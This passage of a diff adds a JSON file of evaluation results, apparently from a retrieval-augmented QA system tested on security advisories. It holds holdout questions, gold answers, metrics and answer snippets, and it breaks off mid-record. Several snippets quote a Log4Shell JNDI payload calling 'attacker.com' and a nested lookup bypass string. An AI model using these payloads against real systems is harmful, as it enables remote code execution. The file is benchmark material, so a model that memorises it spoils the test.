@@ -1,0 +1,2155 @@
+{
+  "total_questions": 24,
+  "question_set": "eval/holdout.jsonl",
+  "offline": true,
+  "variants": {
+    "naive_dense": {
+      "abstention": {
+        "ta": 12,
+        "fa": 12,
+        "fr": 0,
+        "tr": 0,
+        "accuracy": 0.5,
+        "false_answer_rate": 1.0,
+        "over_refusal_rate": 0.0
+      },
+      "gold_citation": {
+        "precision": 0.5833,
+        "recall": 0.5833,
+        "f1": 0.5833,
+        "questions_scored": 12,
+        "citations_predicted": 12,
+        "citations_gold": 12
+      },
+      "gold_answer_recall": {
+        "mean_token_recall": 0.5984,
+        "questions_scored": 12
+      },
+      "retrieval": {
+        "recall_at_final_k": 1.0,
+        "mrr": 0.7778,
+        "questions_scored": 12
+      },
+      "self_consistency": {
+        "entailed_rate": 1.0,
+        "citation_necessity": 1.0,
+        "claims": 24,
+        "backends": [
+          "disabled"
+        ]
+      },
+      "auroc_signal": 0.5,
+      "generators": {
+        "extractive-fallback": 24
+      },
+      "records": [
+        {
+          "qid": "h01",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c00"
+          ],
+          "gold_answer": "XZ Utils versions 5.6.0 and 5.6.1",
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S1::c02",
+            "S1::c01",
+            "S3::c00",
+            "S6::c01"
+          ]
+        },
+        {
+          "qid": "h02",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c01"
+          ],
+          "gold_answer": "m4/build-to-host.m4 runs a bash extraction script during the build process",
+          "predicted_chunk_ids": [
+            "S1::c01"
+          ],
+          "answer_text": "## Technical Mechanism\nThe malicious payload is obfuscated within binary test files (`bad-3-corrupt_lzma2.xz` and `good-large_compressed.lzma`) included in the source tarballs. During the build process via `m4/build-to-host.m4`, a complex bash extraction script decodes the payload if specific target conditions are met (e.g., x86-64 Linux environment using GCC and GNU ld).\n\nThe extracted object file intercepts the RSA key signature verification function `RSA_public_decrypt` in OpenSSH (`sshd`).",
+          "context_injected": [
+            "S1::c01",
+            "S1::c00",
+            "S1::c03",
+            "S1::c02",
+            "S2::c00",
+            "S3::c00"
+          ]
+        },
+        {
+          "qid": "h03",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c00"
+          ],
+          "gold_answer": "Apache Log4j2 versions 2.0-beta9 through 2.14.1",
+          "predicted_chunk_ids": [
+            "S3::c00"
+          ],
+          "answer_text": "# Technical Deep Dive: Log4Shell Vulnerability (CVE-2021-44228)\n\n## Overview\nCVE-2021-44228, dubbed \"Log4Shell\", is a remote code execution (RCE) vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1. The vulnerability resides in the message lookup substitution feature where JNDI (Java Naming and Directory Interface) strings are parsed without sanitization.\n\n## Exploitation Mechanism\nWhen Log4j logs a string containing the syntax `${jndi:ldap://attacker.com/a}`, the JNDI lookup plugin resolves the URL.",
+          "context_injected": [
+            "S3::c00",
+            "S3::c02",
+            "S3::c01",
+            "S1::c00",
+            "S6::c02",
+            "S8::c00"
+          ]
+        },
+        {
+          "qid": "h04",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c02"
+          ],
+          "gold_answer": "log4j2.formatMsgNoLookups=true, or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true",
+          "predicted_chunk_ids": [
+            "S3::c02"
+          ],
+          "answer_text": "- Nested lookups allowing bypasses like `${jndi:${lower:l}${lower:d}ap://...}`.\n\n## Remediation and Mitigation\n1. Upgrade Apache Log4j2 to version 2.17.1 or higher for Java 8 users.\n2. For Log4j 2.10 to 2.14.1, set system property `log4j2.formatMsgNoLookups=true` or environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.\n3. Remove the `JndiLookup` class from the classpath using `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.\n\nCVSS v3.1 Base Score: 10.0 (Critical).",
+          "context_injected": [
+            "S3::c02",
+            "S3::c00",
+            "S3::c01",
+            "S2::c03",
+            "S2::c02",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h05",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "OpenSSL 1.0.1g, or compiling with the flag -DOPENSSL_NO_HEARTBEATS",
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S5::c03",
+            "S5::c01",
+            "S1::c02",
+            "S1::c01",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h06",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S6::c00"
+          ],
+          "gold_answer": "Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1",
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c02",
+            "S6::c01",
+            "S1::c00",
+            "S1::c03",
+            "S1::c02"
+          ]
+        },
+        {
+          "qid": "h07",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S6::c01"
+          ],
+          "gold_answer": "avsvmcloud.com",
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c01",
+            "S6::c02",
+            "S2::c03",
+            "S1::c00",
+            "S2::c01"
+          ]
+        },
+        {
+          "qid": "h08",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S4::c02"
+          ],
+          "gold_answer": "TLS 1.3 or IPsec VPNs, with mandatory multi-factor authentication for remote management access",
+          "predicted_chunk_ids": [
+            "S4::c02"
+          ],
+          "answer_text": "## AC-17 Remote Access\nEnforces explicit authorization for remote access connections. Employs cryptographic mechanisms (TLS 1.3 or IPsec VPNs) to protect the confidentiality and integrity of remote access sessions, mandatory multi-factor authentication (MFA) for all remote management access.",
+          "context_injected": [
+            "S4::c02",
+            "S4::c01",
+            "S1::c02",
+            "S4::c00",
+            "S8::c01",
+            "S8::c00"
+          ]
+        },
+        {
+          "qid": "h09",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S8::c01"
+          ],
+          "gold_answer": "RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers",
+          "predicted_chunk_ids": [
+            "S8::c01"
+          ],
+          "answer_text": "2. **Mandatory Perfect Forward Secrecy (PFS):** Removes RSA static key exchange; all handshakes require Ephemeral Diffie-Hellman (ECDHE or DHE).\n3. **Deprecation of Insecure Algorithms:** Removes support for RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers.\n\n## Cryptographic Cipher Suites\nTLS 1.3 defines simplified cipher suites specifying authenticated encryption with associated data (AEAD):\n- `TLS_AES_128_GCM_SHA256`\n- `TLS_AES_256_GCM_SHA384`\n- `TLS_CHACHA20_POLY1305_SHA256`",
+          "context_injected": [
+            "S8::c01",
+            "S8::c00",
+            "S5::c03",
+            "S4::c02",
+            "S1::c02",
+            "S5::c01"
+          ]
+        },
+        {
+          "qid": "h10",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S7::c02"
+          ],
+          "gold_answer": "SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)",
+          "predicted_chunk_ids": [
+            "S7::c00"
+          ],
+          "answer_text": "# SwiftSafe System Architecture & Memory Safety Guidelines\n\n## Overview\nSwiftSafe is a safe system programming framework designed to eliminate memory corruption vulnerabilities (use-after-free, double free, buffer overflow) in native binaries through compile-time ownership tracking and automated static inspection.\n\n## Memory Safety Guarantees\n1. **Zero Raw Pointers in Public API:** All reference passing must use safe wrappers (`SafeRef<T>` or `UniquePtr<T>`).",
+          "context_injected": [
+            "S7::c00",
+            "S7::c02",
+            "S7::c01",
+            "S5::c01",
+            "S2::c02",
+            "S5::c02"
+          ]
+        },
+        {
+          "qid": "h11",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S2::c03"
+          ],
+          "gold_answer": "Enforce least privilege by default, implement access control mechanisms once and re-use them while minimizing CORS, and disable web server directory listing",
+          "predicted_chunk_ids": [
+            "S2::c02"
+          ],
+          "answer_text": "2. Use positive server-side input validation with strict allowlists.\n3. Escape special characters using context-aware escaping APIs when parameterized interfaces are unavailable.\n\n## A01:2021 \u2013 Broken Access Control\nAccess control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.\n\n### Prevention Controls",
+          "context_injected": [
+            "S2::c02",
+            "S2::c03",
+            "S2::c00",
+            "S4::c00",
+            "S4::c01",
+            "S4::c02"
+          ]
+        },
+        {
+          "qid": "h12",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "CVSS v2 base score 5.0 (CVSS v3: 7.5 High)",
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S1::c03",
+            "S5::c03",
+            "S5::c01",
+            "S1::c00",
+            "S6::c01"
+          ]
+        },
+        {
+          "qid": "h13",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S6::c02"
+          ],
+          "answer_text": "## Remediation Steps\n1. Upgrade SolarWinds Orion platform to version 2020.2.1 HF 2 or 2020.2.5 immediately.\n2. Isolate affected Orion servers and rotate all active directory administrative credentials and SAML signing certificates.",
+          "context_injected": [
+            "S6::c02",
+            "S6::c00",
+            "S3::c01",
+            "S3::c00",
+            "S1::c00",
+            "S2::c03"
+          ]
+        },
+        {
+          "qid": "h14",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c03"
+          ],
+          "answer_text": "The vulnerability was initially identified by Andres Freund while benchmarking SSH latencies, noticing abnormal CPU utilization and 500ms delay increments during connection attempts. Affected systems must immediately downgrade `xz-utils` to version 5.4.x or uncompromised 5.6.2 builds.\n\nCVSS v3.1 Base Score: 10.0 (Critical) \u2014 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H.",
+          "context_injected": [
+            "S1::c03",
+            "S6::c00",
+            "S1::c00",
+            "S5::c03",
+            "S8::c00",
+            "S5::c01"
+          ]
+        },
+        {
+          "qid": "h15",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c02"
+          ],
+          "answer_text": "The extracted object file intercepts the RSA key signature verification function `RSA_public_decrypt` in OpenSSH (`sshd`). By hooking into `systemd` notifications that link `libsystemd` to `liblzma`, the backdoor executes arbitrary commands with root privileges prior to signature validation when a specifically crafted SSH authentication certificate is presented.\n\n## Detection and Mitigation\nThe vulnerability was initially identified by Andres Freund while benchmarking SSH latencies, noticing abnormal CPU utilization and 500ms delay increments during connection attempts.",
+          "context_injected": [
+            "S1::c02",
+            "S1::c01",
+            "S2::c02",
+            "S4::c02",
+            "S2::c00",
+            "S4::c00"
+          ]
+        },
+        {
+          "qid": "h16",
+          "bucket": "unanswerable",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S8::c00"
+          ],
+          "answer_text": "# RFC 8446 Security Overview: Transport Layer Security (TLS) Protocol Version 1.3\n\n## Core Protocol Enhancements\nTLS 1.3 (RFC 8446) redesigns the handshake protocol to improve security and latency over TLS 1.2:\n1. **1-RTT Handshake:** Reduces connection handshake latency from 2-RTT to 1-RTT for full handshakes and 0-RTT for resumption (session tickets).\n2. **Mandatory Perfect Forward Secrecy (PFS):** Removes RSA static key exchange; all handshakes require Ephemeral Diffie-Hellman (ECDHE or DHE).",
+          "context_injected": [
+            "S8::c00",
+            "S5::c01",
+            "S1::c03",
+            "S4::c02",
+            "S6::c00",
+            "S8::c01"
+          ]
+        },
+        {
+          "qid": "h17",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S1::c01",
+            "S6::c00",
+            "S1::c02",
+            "S6::c01"
+          ]
+        },
+        {
+          "qid": "h18",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c01",
+            "S1::c00",
+            "S1::c02",
+            "S1::c03",
+            "S6::c02"
+          ]
+        },
+        {
+          "qid": "h19",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S5::c03",
+            "S5::c01",
+            "S1::c02",
+            "S1::c01",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h20",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S3::c01"
+          ],
+          "answer_text": "When Log4j logs a string containing the syntax `${jndi:ldap://attacker.com/a}`, the JNDI lookup plugin resolves the URL. It contacts the specified LDAP server, retrieves a remote Java class file reference, and executes the payload dynamically within the Java Virtual Machine (JVM) context under the service account privileges.\n\n## Attack Vectors\n- User-Agent HTTP headers containing JNDI lookup strings.\n- Form field values (username, search parameters) logged by application logging handlers.\n- Nested lookups allowing bypasses like `${jndi:${lower:l}${lower:d}ap://...}`.",
+          "context_injected": [
+            "S3::c01",
+            "S3::c00",
+            "S3::c02",
+            "S1::c03",
+            "S1::c00",
+            "S2::c00"
+          ]
+        },
+        {
+          "qid": "h21",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S4::c00"
+          ],
+          "answer_text": "# NIST Special Publication 800-53 Revision 5: Access Control (AC) Security Controls\n\n## AC-2 Account Management\nThe organization manages information system accounts, including establishing, activating, modifying, reviewing, disabling, and removing accounts in accordance with organizational procedures.\n\n### Control Enhancements\n- **AC-2(1) Automated System Account Management:** Employs automated mechanisms to support the management of information system accounts.\n- **AC-2(3) Disable Inactive Accounts:** Automatically disables inactive accounts after 90 days of operational inactivity.\n\n## AC-3 Access Enforcement",
+          "context_injected": [
+            "S4::c00",
+            "S4::c01",
+            "S7::c00",
+            "S7::c01",
+            "S1::c03",
+            "S8::c01"
+          ]
+        },
+        {
+          "qid": "h22",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S8::c00"
+          ],
+          "answer_text": "# RFC 8446 Security Overview: Transport Layer Security (TLS) Protocol Version 1.3\n\n## Core Protocol Enhancements\nTLS 1.3 (RFC 8446) redesigns the handshake protocol to improve security and latency over TLS 1.2:\n1. **1-RTT Handshake:** Reduces connection handshake latency from 2-RTT to 1-RTT for full handshakes and 0-RTT for resumption (session tickets).\n2. **Mandatory Perfect Forward Secrecy (PFS):** Removes RSA static key exchange; all handshakes require Ephemeral Diffie-Hellman (ECDHE or DHE).",
+          "context_injected": [
+            "S8::c00",
+            "S5::c01",
+            "S5::c02",
+            "S8::c01",
+            "S5::c03",
+            "S5::c00"
+          ]
+        },
+        {
+          "qid": "h23",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S1::c03",
+            "S1::c02",
+            "S1::c01",
+            "S6::c01",
+            "S4::c02"
+          ]
+        },
+        {
+          "qid": "h24",
+          "bucket": "adversarial",
+          "is_answerable": false,
+          "abstained": false,
+          "gold_chunk_ids": [],
+          "gold_answer": null,
+          "predicted_chunk_ids": [
+            "S7::c02"
+          ],
+          "answer_text": "- Static analysis pass checks for concurrency race conditions on shared global memory.\n- Safe dynamic memory allocations require `SwiftSafeAllocator::allocate_aligned(size_t bytes, size_t alignment)`.",
+          "context_injected": [
+            "S7::c02",
+            "S7::c00",
+            "S7::c01",
+            "S5::c01",
+            "S2::c00",
+            "S8::c01"
+          ]
+        }
+      ]
+    },
+    "hybrid_rrf": {
+      "abstention": {
+        "ta": 12,
+        "fa": 12,
+        "fr": 0,
+        "tr": 0,
+        "accuracy": 0.5,
+        "false_answer_rate": 1.0,
+        "over_refusal_rate": 0.0
+      },
+      "gold_citation": {
+        "precision": 0.6667,
+        "recall": 0.6667,
+        "f1": 0.6667,
+        "questions_scored": 12,
+        "citations_predicted": 12,
+        "citations_gold": 12
+      },
+      "gold_answer_recall": {
+        "mean_token_recall": 0.6817,
+        "questions_scored": 12
+      },
+      "retrieval": {
+        "recall_at_final_k": 1.0,
+        "mrr": 0.8194,
+        "questions_scored": 12
+      },
+      "self_consistency": {
+        "entailed_rate": 1.0,
+        "citation_necessity": 1.0,
+        "claims": 24,
+        "backends": [
+          "disabled"
+        ]
+      },
+      "auroc_signal": 0.5,
+      "generators": {
+        "extractive-fallback": 24
+      },
+      "records": [
+        {
+          "qid": "h01",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c00"
+          ],
+          "gold_answer": "XZ Utils versions 5.6.0 and 5.6.1",
+          "predicted_chunk_ids": [
+            "S1::c00"
+          ],
+          "answer_text": "# Technical Analysis of CVE-2024-3094: XZ Utils Backdoor\n\n## Overview\nCVE-2024-3094 is a critical supply-chain vulnerability discovered in XZ Utils versions 5.6.0 and 5.6.1. The backdoor was introduced by an upstream maintainer account named Jia Tan over an extended period. The compromise alters functions within `liblzma`, specifically targeting OpenSSH server authentication mechanisms when linked against `systemd` socket activation libraries.\n\n## Technical Mechanism",
+          "context_injected": [
+            "S1::c00",
+            "S3::c00",
+            "S1::c01",
+            "S1::c02",
+            "S2::c00",
+            "S1::c03"
+          ]
+        },
+        {
+          "qid": "h02",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S1::c01"
+          ],
+          "gold_answer": "m4/build-to-host.m4 runs a bash extraction script during the build process",
+          "predicted_chunk_ids": [
+            "S1::c01"
+          ],
+          "answer_text": "## Technical Mechanism\nThe malicious payload is obfuscated within binary test files (`bad-3-corrupt_lzma2.xz` and `good-large_compressed.lzma`) included in the source tarballs. During the build process via `m4/build-to-host.m4`, a complex bash extraction script decodes the payload if specific target conditions are met (e.g., x86-64 Linux environment using GCC and GNU ld).\n\nThe extracted object file intercepts the RSA key signature verification function `RSA_public_decrypt` in OpenSSH (`sshd`).",
+          "context_injected": [
+            "S1::c01",
+            "S1::c00",
+            "S1::c02",
+            "S1::c03",
+            "S5::c01",
+            "S3::c01"
+          ]
+        },
+        {
+          "qid": "h03",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c00"
+          ],
+          "gold_answer": "Apache Log4j2 versions 2.0-beta9 through 2.14.1",
+          "predicted_chunk_ids": [
+            "S3::c00"
+          ],
+          "answer_text": "# Technical Deep Dive: Log4Shell Vulnerability (CVE-2021-44228)\n\n## Overview\nCVE-2021-44228, dubbed \"Log4Shell\", is a remote code execution (RCE) vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1. The vulnerability resides in the message lookup substitution feature where JNDI (Java Naming and Directory Interface) strings are parsed without sanitization.\n\n## Exploitation Mechanism\nWhen Log4j logs a string containing the syntax `${jndi:ldap://attacker.com/a}`, the JNDI lookup plugin resolves the URL.",
+          "context_injected": [
+            "S3::c00",
+            "S3::c02",
+            "S1::c00",
+            "S6::c02",
+            "S1::c03",
+            "S3::c01"
+          ]
+        },
+        {
+          "qid": "h04",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S3::c02"
+          ],
+          "gold_answer": "log4j2.formatMsgNoLookups=true, or the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true",
+          "predicted_chunk_ids": [
+            "S3::c02"
+          ],
+          "answer_text": "- Nested lookups allowing bypasses like `${jndi:${lower:l}${lower:d}ap://...}`.\n\n## Remediation and Mitigation\n1. Upgrade Apache Log4j2 to version 2.17.1 or higher for Java 8 users.\n2. For Log4j 2.10 to 2.14.1, set system property `log4j2.formatMsgNoLookups=true` or environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.\n3. Remove the `JndiLookup` class from the classpath using `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.\n\nCVSS v3.1 Base Score: 10.0 (Critical).",
+          "context_injected": [
+            "S3::c02",
+            "S3::c00",
+            "S3::c01",
+            "S6::c01",
+            "S1::c02",
+            "S7::c00"
+          ]
+        },
+        {
+          "qid": "h05",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S5::c03"
+          ],
+          "gold_answer": "OpenSSL 1.0.1g, or compiling with the flag -DOPENSSL_NO_HEARTBEATS",
+          "predicted_chunk_ids": [
+            "S5::c00"
+          ],
+          "answer_text": "# Heartbleed Bug Advisory: OpenSSL Memory Disclosure (CVE-2014-0160)\n\n## Overview\nCVE-2014-0160, known as \"Heartbleed\", is a severe memory leakage flaw in the OpenSSL cryptographic software library (versions 1.0.1 through 1.0.1f). The bug allows remote attackers to read up to 64 kilobytes of host memory per heartbeat payload without authorization.\n\n## Root Cause Analysis\nThe flaw stems from missing bounds checking on a TLS heartbeat extension request payload.",
+          "context_injected": [
+            "S5::c00",
+            "S5::c03",
+            "S5::c01",
+            "S5::c02",
+            "S1::c01",
+            "S1::c03"
+          ]
+        },
+        {
+          "qid": "h06",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S6::c00"
+          ],
+          "gold_answer": "Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1",
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c02",
+            "S6::c01",
+            "S1::c03",
+            "S1::c02",
+            "S1::c00"
+          ]
+        },
+        {
+          "qid": "h07",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S6::c01"
+          ],
+          "gold_answer": "avsvmcloud.com",
+          "predicted_chunk_ids": [
+            "S6::c00"
+          ],
+          "answer_text": "# Cybersecurity Advisory: SolarWinds SUNBURST Supply Chain Attack\n\n## Executive Summary\nIn late 2020, threat group UNC2452 executed a sophisticated supply chain attack against SolarWinds Orion platform releases 2019.4 HF 5 through 2020.2.1 HF 1. The attackers trojanized the source code build environment to inject a backdoor component dubbed \"SUNBURST\" (`SolarWinds.Orion.Core.BusinessLayer.dll`).\n\n## Attack Characteristics & Persistence",
+          "context_injected": [
+            "S6::c00",
+            "S6::c01",
+            "S1::c00",
+            "S2::c01",
+            "S1::c02",
+            "S1::c01"
+          ]
+        },
+        {
+          "qid": "h08",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S4::c02"
+          ],
+          "gold_answer": "TLS 1.3 or IPsec VPNs, with mandatory multi-factor authentication for remote management access",
+          "predicted_chunk_ids": [
+            "S4::c02"
+          ],
+          "answer_text": "## AC-17 Remote Access\nEnforces explicit authorization for remote access connections. Employs cryptographic mechanisms (TLS 1.3 or IPsec VPNs) to protect the confidentiality and integrity of remote access sessions, mandatory multi-factor authentication (MFA) for all remote management access.",
+          "context_injected": [
+            "S4::c02",
+            "S4::c01",
+            "S4::c00",
+            "S8::c01",
+            "S2::c03",
+            "S8::c00"
+          ]
+        },
+        {
+          "qid": "h09",
+          "bucket": "answerable",
+          "is_answerable": true,
+          "abstained": false,
+          "gold_chunk_ids": [
+            "S8::c01"
+          ],
+          "gold_answer": "RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers",
+          "predicted_chunk_ids": [
+            "S8::c01"
+          ],
+          "answer_text": "2. **Mandatory Perfect Forward Secrecy (PFS):** Removes RSA static key exchange; all handshakes require Ephemeral Diffie-Hellman (ECDHE or DHE).\n3. **Deprecation of Insecure Algorithms:** Removes support for RC4, MD5, SHA-224, 3DES, static RSA key exchange, and CBC mode ciphers.\n\n## Cryptographic Cipher Suites\nTLS 1.3 defines simplified cipher suites specifying authenticated encryption with associated data (AEAD):\n- `TLS_AES_128_GCM_SHA256`\n- `TLS_AES_256_GCM_SHA384`\n- `TLS_CHACHA20_POLY1305_SHA256`",
+          "context_injected": [
+            "S8::c01",
+            "S8::c00",
+            "S4::c02",
